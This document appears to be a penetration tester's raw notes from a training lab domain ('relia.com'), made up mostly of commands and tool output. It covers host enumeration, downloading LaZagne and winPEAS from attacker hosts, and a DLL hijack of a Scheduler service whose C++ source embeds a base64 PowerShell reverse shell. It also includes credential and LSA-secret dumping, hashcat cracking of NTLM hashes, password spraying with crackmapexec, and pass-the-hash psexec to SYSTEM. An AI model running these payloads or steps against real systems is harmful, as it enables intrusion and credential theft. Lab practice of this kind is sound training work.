OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-10000-00001-AA570
Original Install Date:     10/18/2022, 12:06:51 PM
System Boot Time:          4/4/2024, 8:35:12 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC

PS C:\Users\michelle> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


				NETWORK: 
PS C:\Users\Public\Downloads> ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : INTRANET
   Primary Dns Suffix  . . . . . . . : relia.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : relia.com
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-44-F6
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.128.7(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.128.254
   DNS Servers . . . . . . . . . . . : 172.16.128.6
   NetBIOS over Tcpip. . . . . . . . : Enabled

PS C:\Users\Public\Downloads> route print
===========================================================================
Interface List
 14...00 50 56 ab 44 f6 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================
IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   172.16.128.254     172.16.128.7     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     172.16.128.0    255.255.255.0         On-link      172.16.128.7    271
     172.16.128.7  255.255.255.255         On-link      172.16.128.7    271
   172.16.128.255  255.255.255.255         On-link      172.16.128.7    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link      172.16.128.7    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link      172.16.128.7    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0   172.16.128.254       1
===========================================================================
IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

PS C:\Users\Public\Downloads> arp -A
Interface: 172.16.128.7 --- 0xe
  Internet Address      Physical Address      Type
  172.16.128.6          00-50-56-ab-91-cf     dynamic
  172.16.128.254        00-50-56-ab-de-aa     dynamic
  172.16.128.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static

PS C:\Users\Public\Downloads> nslookup
Default Server:  UnKnown
Address:  172.16.128.6


				CREDS:
LaZagne: NONE
iwr -uri http://192.168.45.170:5555/LaZagne.exe -Outfile laz.exe
PS C:\Users\michelle\Desktop> .\LaZagne.exe all
[+] 0 passwords have been found.

Powershell password hunting: NONE
PS C:\> (Get-PSReadlineOption).HistorySavePath
PS C:\Users\michelle\Desktop> type C:\Users\michelle\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt


				INTERESTING FILES: 
PS C:\Users\michelle\Desktop> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\michelle\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/29/2024   5:45 AM             34 local.txt      

Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\michelle\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force

PS C:\Users\michelle\Desktop> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\passwords.txt
type C:\xampp\apache\README.txt
type C:\xampp\htdocs\wordpress\wp-content\themes\twentytwenty\readme.txt
type C:\xampp\htdocs\wordpress\wp-content\themes\twentytwentyone\readme.txt 
type C:\xampp\htdocs\wordpress\wp-content\themes\twentytwentytwo\readme.txt 

PS C:\Users\michelle\Desktop> type C:\xampp\webdav\webdav.txt 
type C:\xampp\webdav\webdav.txt 
WEB-DAV f r den gemeinsamen REMOTE-Zugriff
auf WWW-Dokumente  ber den Apache2.
Die Module mod_dav.so und mod_dav_fs.so auskommentieren
URL: http://localhost/webdav/
User: wampp Password: xampp
E-Mail-Adresse bei Dreamweaver angeben. 
Lokales Directory: /xampp/webdav/

type C:\xampp\mysql\data\my.ini 

PS C:\Users\michelle\Desktop> type C:\xampp\mysql\backup\my.ini 
type C:\xampp\mysql\backup\my.ini 
[mysqld]
datadir=c:/xampp/mysql/data
[client]

type c:/xampp/mysql/data
type : Access to the path 'C:\xampp\mysql\data' is denied.


				 PRIV ESC:
iwr -uri http://192.168.45.170:5555/winPEASx64.exe -Outfile winpea.exe
.\winpea.exe

          ͹ Users
  Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups                                            
  Current user: michelle
  Current groups: Domain Users, Everyone, Users, Builtin\Remote Desktop Users, Remote Interactive Logon, Interactive, Authenticated Users, This Organization, Local, INTRANETRDP, Authentication authority asserted identity

    INTRANET\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

          ͹ Logged users
    RELIA\andrea
    RELIA\michelle
    INTRANET\Administrator

                                   ͹ Services Information                                      

          ͹ Interesting Services -non Microsoft-
  Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services      
                                                                                         
    Apache2.4(Apache Software Foundation - Apache2.4)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Auto - Running                                                                             
    Possible DLL Hijacking in binary folder: C:\xampp\apache\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])                                                                     
    Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
   =================================================================================================                                                                                              

    mysql(mysql)[C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql] - Auto - Running - No quotes and Space detected
    Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])                                                                      
   =================================================================================================                                                                                              

    Scheduler(Scheduler)["C:\Scheduler\scheduler.exe"] - Auto - Running - isDotNet
    Possible DLL Hijacking in binary folder: C:\Scheduler (Users [AppendData/CreateDirectories WriteData/CreateFiles])                                                                            
    Scheduling Service RELIA

          ͹ Modifiable Services
  Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                   
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    ConsentUxUserSvc_1a08ab: GenericExecute (Start/Stop)
    CredentialEnrollmentManagerUserSvc_1a08ab: GenericExecute (Start/Stop)
    DeviceAssociationBrokerSvc_1a08ab: GenericExecute (Start/Stop)
    DevicePickerUserSvc_1a08ab: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_1a08ab: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_1a08ab: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_1a08ab: GenericExecute (Start/Stop)
    UdkUserSvc_1a08ab: GenericExecute (Start/Stop)
    UnistoreSvc_1a08ab: GenericExecute (Start/Stop)
    UserDataSvc_1a08ab: GenericExecute (Start/Stop)
    WpnUserService_1a08ab: GenericExecute (Start/Stop)

                                   ͹ Network Information                                      

          ͹ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

          ͹ Found Wordpress Files
File: C:\xampp\htdocs\wordpress\wp-config.php
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'root' );
/** Database password */
define( 'DB_PASSWORD', '' );
/** Database hostname */
define( 'DB_HOST', 'localhost' );
 * This will force all users to have to log in again.


				HTTP: 80 443 5985 47001
http://172.16.128.7/wordpress/
http://intranet.relia.com/wordpress
http://intranet.relia.com/wordpress/sample-page/

sudo nano /etc/hosts
intranet.relia.com	172.16.128.7

wpscan --url http://intranet.relia.com --enumerate p --plugins-detection aggressive
wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --api-token 0SnNawrbLxKv9EAVVtOxl4MCQ8NUleZa69qEYn5bDus --url http://intranet.relia.com 
wpscan --url http://intranet.relia.com --disable-tls-checks --enumerate u --random-user-agent --api-token 0SnNawrbLxKv9EAVVtOxl4MCQ8NUleZa69qEYn5bDus
wpscan --url http://intranet.relia.com/wordpress/sample-page/ --disable-tls-checks --enumerate u --random-user-agent --api-token 0SnNawrbLxKv9EAVVtOxl4MCQ8NUleZa69qEYn5bDus


				DDL HIJACKING:
HIJACK: WINPEAS
Scheduler(Scheduler)["C:\Scheduler\scheduler.exe"] - Auto - Running - isDotNet
Possible DLL Hijacking in binary folder: C:\Scheduler (Users [AppendData/CreateDirectories WriteData/CreateFiles])                                                                            
Scheduling Service RELIA

	TRANSFER FILES: WINDOWS:michelle > LINUX:Kali > WINDOWS:offsec
xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.198.7 /size:80% /drive:kali,.
customlib.dll
scheduler.exe

		ANALYSIS: LINUX:kali > Transfer:procmon64.exe
xfreerdp /u:offsec /p:'lab' /v:192.168.1198.250 /size:80% /drive:kali,.
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
procmon64.exe
- Create / placed in the same directory as scheduler.exe 
- Create a service for it and start the service 
https://www.tenforums.com/tutorials/4499-start-stop-disable-services-windows-10-a.html
https://www.youtube.com/watch?v=8Ojo2M-HhzE
- Press the Win + R keys to open the Run dialog, type services.msc into Run, press Enter, and go to step 4 below.
- Open command line as Administrator 
- Copy path to .exe: "C:\Scheduler\scheduler.exe"
- Run command: sc create "Scheduler" binPath= "C:\Scheduler\scheduler.exe"
C:\Windows\system32>sc create "Scheduler" binPath= "C:\Scheduler\scheduler.exe"
[SC] CreateService SUCCESS
- From services.msc find new service and start. 

DLL HIJACK:
# Displaying information about the running service scheduler
PS C:\Users\michelle> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Scheduler              Running "C:\Scheduler\scheduler.exe"

# Displaying permissions on the binary of scheduler
PS C:\Users\michelle> icacls \Scheduler\scheduler.exe
\Scheduler\scheduler.exe NT AUTHORITY\SYSTEM:(I)(F)
                         BUILTIN\Administrators:(I)(F)
                         BUILTIN\Users:(I)(RX)

# Restarting Scheduler
PS C:\Users\michelle> Restart-Service Scheduler
WARNING: Waiting for service 'Scheduler (Scheduler)' to start...

# Add Filter for Scheduler.exe > Procmon
Filter: process name:"scheduler.exe", results:"NAME NOT FOUND", operation:"CreateFile"
C:\Windows\System32\beyondhelper.dll
customlib

# Display the PATH environment variable
PS C:\Users\michelle> $env:path
C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Windows\System32\OpenSSH\;
C:\Users\michelle\AppData\Local\Microsoft\WindowsApps;

# Code example of a basic DLL in C++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGpAA==");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

# Cross-Compile the C++ Code to a 64-bit DLL
kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o beyondhelper.dll

# Download compiled DLL
RDP: kali > machine 

# Restart the service Scheduler and confirm reverse shell
PS C:\Users\steve\Documents> Restart-Service Scheduler

# Listener 
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
connect to [192.168.45.214] from (UNKNOWN) [192.168.238.191] 62672
PS C:\Windows\system32>


			Administrator: Proof.txt
PS C:\Users\Administrator\Desktop> whoami
intranet\administrator

PS C:\Users\Administrator\Desktop> hostname
INTRANET

PS C:\Users\Administrator\Desktop> cat proof.txt
3d0106f0287ec7e26be6cc4397d07002

PS C:\Users\Administrator\Desktop> systeminfo
Host Name:                 INTRANET
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-10000-00001-AA164
Original Install Date:     10/18/2022, 12:06:51 PM
System Boot Time:          4/4/2024, 8:35:12 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC

PS C:\Users\Administrator\Desktop> net users /domain
The request will be processed at a domain controller for domain relia.com.

			NETWORK:
PS C:\Users\Administrator\Desktop> ipconfig /all
Windows IP Configuration
   Host Name . . . . . . . . . . . . : INTRANET
   Primary Dns Suffix  . . . . . . . : relia.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : relia.com
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-AB-3E-F2
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.198.7(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.198.254
   DNS Servers . . . . . . . . . . . : 172.16.198.6
   NetBIOS over Tcpip. . . . . . . . : Enabled

			Files of interest:
PS C:\Users> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\michelle\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/30/2024   8:58 PM             34 local.txt   

PS C:\Users> Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/30/2024   8:58 PM             34 proof.txt  

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
Get-ChildItem -Path C:\Users\Administrator\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue


			CREDS:
Powershell password hunting:
PS C:\Users\Administrator\Desktop> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Laz: 
PS C:\Users\Administrator\Documents> iwr -uri http://192.168.45.214:8000/LaZagne.exe -Outfile laz.exe
PS C:\Users\Administrator\Documents> .\laz.exe all
------------------- Hashdump passwords -----------------
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b4547a5116dd13e6e206d1286a06b28:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9756266d27a75c923beb3c8c654b31d4:::
------------------- Pypykatz passwords -----------------
[+] Shahash found !!!
Shahash: 65b6774d091b82d025fc5422368f9d3d34589b84
Nthash: ce3f12443651168b3793f5fbcccff9db
Login: andrea
[+] Shahash found !!!
Shahash: 791681268eedc1471f7d2953fe0c55ac60a9b9b8
Nthash: 18d4098c8d9ff721745b388ad4a442bf
Login: michelle
[+] Shahash found !!!
Shahash: 351fedcd57be450b6c019cd9a5466c4496cee888
Nthash: 7102bf8b04f41ce0b1a3ff4397260ad8
Login: INTRANET$
[+] Shahash found !!!
Shahash: 1589b87670e68f737543a5be1fc49fd744330f4c
Nthash: 8b4547a5116dd13e6e206d1286a06b28
Login: Administrator
------------------- Lsa_secrets passwords -----------------
$MACHINE.ACC
0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   D2 4F 11 AD 74 F3 1F 3E 9E BF CE C8 B4 D2 91 40    .O..t..>.......@
0020   17 96 8C 38 0B E4 3D 53 2F 07 1E 7D 4F 0E B8 6A    ...8..=S/..}O..j
0030   38 B5 D6 60 C0 9E E6 90 AA 6E 97 28 BF A9 72 2B    8..`.....n.(..r+
0040   29 FF 90 1C 9C 62 E0 37 D2 5E 87 54 E0 F3 1A E0    )....b.7.^.T....
0050   C7 E7 90 D8 A5 DA 4F 8E D1 61 3F A5 4B 78 A9 DD    ......O..a?.Kx..
0060   48 F1 D3 E0 30 B3 65 4D E8 5F F0 C9 D8 FA A3 6B    H...0.eM._.....k
0070   EA 90 9E A1 AB D5 E0 AF 05 02 85 77 3B 53 EE D2    ...........w;S..
0080   AB C1 02 FB 05 21 16 A4 59 61 08 30 32 B7 52 80    .....!..Ya.02.R.
0090   6F BE 58 02 D9 CC 38 21 56 4F 24 B8 B1 F3 5D 39    o.X...8!VO$...]9
00A0   E6 9A AC 08 48 E5 37 FF 09 C7 74 CC 29 E2 2C D0    ....H.7...t.).,.
00B0   EA 4C 85 CA E0 0C 7E ED 2B CD 60 C2 DD 5E EF 08    .L....~.+.`..^..
00C0   65 61 26 89 FD E8 CE 67 CF 49 57 5D 94 F5 DD 78    ea&....g.IW]...x
00D0   AC BF C1 DD AE DF 43 00 BC B7 76 21 C3 CB A1 14    ......C...v!....
00E0   12 39 F6 3A 90 82 73 EA 0F A1 0E 74 5C 03 62 59    .9.:..s....t..bY
00F0   00 58 39 7E 4D AE 94 BE 7B 81 4E 99 D2 C4 A9 39    .X9~M...{.N....9
0100   D1 31 DD 56 18 11 97 1C F4 3D 70 47 61 84 1A 2B    .1.V.....=pGa..+
DPAPI_SYSTEM
0000   01 00 00 00 6F 9E E6 3F AD 1F B7 A5 66 CC AD FA    ....o..?....f...
0010   AF FC 7E E5 8D F0 29 49 7D 1A 93 13 CD 93 EF 56    ..~...)I}......V
0020   5E 7E E4 24 3D E7 3A 43 59 65 22 E2                ^~.$=.:CYe".
NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   CA BE 2F 81 A2 9B 86 73 5C 46 B7 12 6F 19 EF 2C    ../....s.F..o..,
0020   5A 9A 59 9C 25 86 F5 EA DD 74 8F 83 44 06 45 88    Z.Y.%....t..D.E.
0030   92 62 ED 44 31 1D 7D A7 BF 58 BB ED A4 3B E3 FE    .b.D1.}..X...;..
0040   D7 DE 68 75 91 0A FF 20 27 FA 92 5F 71 26 53 BB    ..hu... '.._q&S.
0050   EA 66 D1 9D 9F F1 64 3F 26 04 94 E7 16 75 E5 31    .f....d?&....u.1
_SC_Scheduler
0000   2C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ,...............
0010   5F 00 53 00 31 00 31 00 31 00 31 00 31 00 31 00    _.S.1.1.1.1.1.1.
0020   31 00 31 00 31 00 70 00 30 00 72 00 74 00 69 00    1.1.1.p.0.r.t.i.
0030   6F 00 6E 00 7A 00 65 00 32 00 31 00 00 00 00 00    o.n.z.e.2.1.....
_SC_SNMPTRAP
0000   24 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    $...............
0010   50 00 61 00 73 00 73 00 77 00 6F 00 72 00 64 00    P.a.s.s.w.o.r.d.
0020   50 00 61 00 73 00 73 00 77 00 6F 00 72 00 64 00    P.a.s.s.w.o.r.d.
0030   5F 00 36 00 00 00 00 00 00 00 00 00 00 00 00 00    _.6.............


			CRACKING NTLM: 
Nthash: ce3f12443651168b3793f5fbcccff9db
Login: andrea
hashcat -m 1000 andrea.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
ce3f12443651168b3793f5fbcccff9db:PasswordPassword_6

Nthash: 18d4098c8d9ff721745b388ad4a442bf
Login: michelle
hashcat -m 1000 michelle.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
18d4098c8d9ff721745b388ad4a442bf:NotMyPassword0k?         

Nthash: 7102bf8b04f41ce0b1a3ff4397260ad8
Login: INTRANET$
hashcat -m 1000 INTRANET.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
Exhausted

Nthash: 8b4547a5116dd13e6e206d1286a06b28
Login: Administrator
hashcat -m 1000 Administrator.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
Exhausted


			SPRAY AND PRAY:
crackmapexec smb 172.16.198.0/24 -u michelle -p 'NotMyPassword0k?' --shares
SMB         172.16.198.254  445    LOGIN            [+] relia.com\michelle:NotMyPassword0k? 
SMB         172.16.198.254  445    LOGIN            IPC$            READ            Remote IPC

SMB         172.16.198.5    445    MAIL             [+] relia.com\michelle:NotMyPassword0k? 
SMB         172.16.198.5    445    MAIL             IPC$            READ            Remote IPC

SMB         172.16.198.6    445    DC02             [+] relia.com\michelle:NotMyPassword0k? 
SMB         172.16.198.6    445    DC02             IPC$            READ            Remote IPC
SMB         172.16.198.6    445    DC02             NETLOGON        READ            Logon server share                                                                                            
SMB         172.16.198.6    445    DC02             SYSVOL          READ            Logon server 

SMB         172.16.198.7    445    INTRANET         [+] relia.com\michelle:NotMyPassword0k? 
SMB         172.16.198.7    445    INTRANET         IPC$            READ            Remote IPC

SMB         172.16.198.14   445    WK01             [+] Enumerated shares
SMB         172.16.198.14   445    WK01             IPC$            READ            Remote IPC

SMB         172.16.198.15   445    WK02             [+] relia.com\michelle:NotMyPassword0k? 
SMB         172.16.198.15   445    WK02             IPC$            READ            Remote IPC

SMB         172.16.198.21   445    FILES            [+] relia.com\michelle:NotMyPassword0k? 
SMB         172.16.198.21   445    FILES            apps            READ            
SMB         172.16.198.21   445    FILES            IPC$            READ            Remote IPC
SMB         172.16.198.21   445    FILES            monitoring      READ            
SMB         172.16.198.21   445    FILES            scripts         READ            

SMB         172.16.198.30   445    WEBBY            [+] Enumerated shares
SMB         172.16.198.30   445    WEBBY            IPC$            READ            Remote IPC

SMB: no writable shares
impacket-psexec relia.com/michelle:'NotMyPassword0k?'@172.16.198.30 cmd.exe
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

WINRM: Error: Exiting with code 1
evil-winrm -i 172.16.198.30 -u michelle -p 'NotMyPassword0k?'

WMI: access denied
impacket-wmiexec relia/michelle:'NotMyPassword0k?'@172.16.198.5

RDP: 254 5 6 7 14 15 21 30 = ACCESS .7
xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.198.30

SSH: 19 20
ssh michelle@172.16.198.19 = Permission denied (publickey).
ssh michelle@172.16.198.20 = Permission denied


crackmapexec smb 172.16.198.0/24 -u andrea -p 'PasswordPassword_6' --shares
SMB         172.16.198.254  445    LOGIN            [+] relia.com\andrea:PasswordPassword_6 
SMB         172.16.198.254  445    LOGIN            IPC$            READ            Remote IPC

SMB         172.16.198.5    445    MAIL             [+] relia.com\andrea:PasswordPassword_6 
SMB         172.16.198.5    445    MAIL             IPC$            READ            Remote IPC

SMB         172.16.198.6    445    DC02             [+] relia.com\andrea:PasswordPassword_6 
SMB         172.16.198.6    445    DC02             IPC$            READ            Remote IPC
SMB         172.16.198.6    445    DC02             NETLOGON        READ            Logon server 

SMB         172.16.198.7    445    INTRANET         [+] relia.com\andrea:PasswordPassword_6 
SMB         172.16.198.7    445    INTRANET         IPC$            READ            Remote IPC

SMB         172.16.198.14   445    WK01             [+] relia.com\andrea:PasswordPassword_6 
SMB         172.16.198.14   445    WK01             IPC$            READ            Remote IPC

SMB         172.16.198.15   445    WK02             [+] relia.com\andrea:PasswordPassword_6 
SMB         172.16.198.15   445    WK02             IPC$            READ            Remote IPC

SMB         172.16.198.21   445    FILES            [+] relia.com\andrea:PasswordPassword_6 
SMB         172.16.198.21   445    FILES            apps            READ            
SMB         172.16.198.21   445    FILES            IPC$            READ            Remote IPC
SMB         172.16.198.21   445    FILES            monitoring      READ            
SMB         172.16.198.21   445    FILES            scripts         READ   

SMB         172.16.198.30   445    WEBBY            [+] relia.com\andrea:PasswordPassword_6 
SMB         172.16.198.30   445    WEBBY            IPC$            READ            Remote IPC

SMB: no writable shares
impacket-psexec relia.com/andrea:'PasswordPassword_6'@172.16.198.7 cmd.exe
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.

WMI: access denied
impacket-wmiexec relia.com/andrea:'PasswordPassword_6'@172.16.198.30

WINRM: Error: Exiting with code 1
evil-winrm -i 172.16.198.30 -u andrea -p 'PasswordPassword_6'

RDP: 254 5 6 7 14 15 21 30 = ACCESS .15
xfreerdp /u:andrea /p:'PasswordPassword_6' /v:172.16.198.30

SSH: 19 20
ssh andrea@172.16.198.19 = Permission denied (publickey).
ssh andrea@172.16.198.20 = Permission denied


				ACCESS:
RDP:
xfreerdp /u:andrea /p:'PasswordPassword_6' /v:172.16.198.15 /size:80% /drive:kali,.

SMB:
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-psexec -hashes 00000000000000000000000000000000:8b4547a5116dd13e6e206d1286a06b28 Administrator@172.16.198.7 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 172.16.198.7.....
[*] Found writable share ADMIN$
[*] Uploading file ooCmucqH.exe
[*] Opening SVCManager on 172.16.198.7.....
[*] Creating service zhOM on 172.16.198.7.....
[*] Starting service zhOM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system


--------------------------------------------------------------------------------------------------
		.15 - local and proof - WK02 - andrea:Local.txt ✅

┌──(kali㉿kali)-[~]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.128.15

RDP: 
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
|_ssl-date: 2024-04-29T02:10:20+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WK02.relia.com
| Issuer: commonName=WK02.relia.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-30T21:44:06
| Not valid after:  2024-09-29T21:44:06
| MD5:   9f48:4e27:da6d:d677:fe6c:39f7:cc03:e7c3
| SHA-1: 5fab:0e62:dab5:2847:2590:625d:117e:8073:2075:5e49
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WK02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WK02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.22000
|_  System_Time: 2024-04-29T02:09:40+00:00

RPC:
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC

SMB:
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
| nbstat: NetBIOS name: WK02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:02:9d (VMware)
| Names:
|   WK02<20>             Flags: <unique><active>
|   WK02<00>             Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
| Statistics:
